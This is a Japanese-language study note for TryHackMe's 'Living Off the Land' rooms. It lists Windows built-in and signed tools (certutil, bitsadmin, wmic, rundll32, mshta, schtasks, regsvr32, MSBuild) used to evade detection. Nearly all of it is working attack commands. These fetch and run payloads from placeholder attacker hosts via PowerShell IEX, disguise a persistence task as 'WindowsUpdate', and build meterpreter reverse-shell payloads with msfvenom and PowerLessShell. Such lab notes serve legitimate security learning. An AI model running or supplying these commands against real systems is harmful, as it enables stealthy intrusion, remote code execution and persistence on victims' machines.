# Living Off the Land

https://tryhackme.com/r/room/livingofftheland

https://tryhackme.com/room/livingoffthelandattacks

OS 標準のツール、または Microsoft 署名付きのツールを使って検出を回避する

## LOLBAS

https://lolbas-project.github.io/

ツールの（本来の用途とは異なる）便利な利用方法が網羅されているプロジェクト

## ファイル操作

ここでファイルダウンロードと書いているのは、ターゲットマシンにダウンロードするという意味。

### certutil

ファイルダウンロード

```ps
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```

エンコード、デコード

```ps
certutil -encode payload.exe Encoded-payload.txt

certutil -decode Encoded-payload.txt payload.exe
```

### bitsadmin

ファイルダウンロード

```ps
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```

### findstr

SMB 経由でファイルダウンロード

```ps
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```

## ファイル実行

### explorer

```ps
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

### wmic

管理者がローカルまたはリモートのWindowsシステムを照会および管理するためのツール。  
脅威アクターは、プロセスを起動することでリモートからコマンドを実行するために使用する。  
WMI ではコマンドの出力を表示することはできない。

```ps
wmic.exe process call create calc
```

```ps
wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"

wmic /node:TARGETHOST process get name,commandline

wmic process call create "notepad.exe" /hidden
```

### rundll32

#### 単純な例：指定したdllの指定した関数を実行

```ps
rundll32.exe C:\Users\Public\backdoor.dll,Start

rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"

rundll32.exe C:\Windows\Temp\loader.dll,Run
```

#### 複雑な例：javascript を渡して mshtml.dll に実行させる

1. `javascript:...` の文字列全体がrundll32.exe に渡される
2. rundll32 は、`javascript:...`の文字列を解析し、dllのパスと実行する関数を認識する
3. rundll32 は、その関数に `eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");` を渡して実行させるイメージ。（あくまでイメージで、正確にその文字列が渡るのかは未確認）

```ps
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

Powershell を実行してファイルダウンロードしている

```ps
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

### mshta

VBScript または JavaScript コードを含むことができる HTML アプリケーション ( HTA ) ファイルを実行する。

```ps
mshta "http://attacker.example/payload.hta"

mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"

mshta "C:\Users\Public\malicious.hta"
```

### schtasks

永続化

```ps
schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""

schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05

schtasks /Run /TN "WindowsUpdate"
```

## ホワイトリストバイパス

### regsvr32

```shell
# 32bit 版ペイロードを作ることに注意
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f dll -a x86 > live0fftheland.dll

msf6 > use exploit/multi/handler
```

```ps
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll

c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
```

- 64bit の DLL を作った場合は、C:\Windows\SysWOW64\regsvr32.exe を実行する必要がある。
- 学習環境では機能しなかったので、信頼性は疑問符。

### bash

Windows Subsystem for Linux (WSL) が有効になっている前提

```ps
bash.exe -c <p​​ath-to-payload>
```

## PowerLessShell

ps スクリプトを、Powershell の代わりに、MSBuild を使って実行する。

```shell
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git

msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1

msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"

# ペイロードを MSBuild ツールと互換性のあるものに変換
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
```

```shell
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```
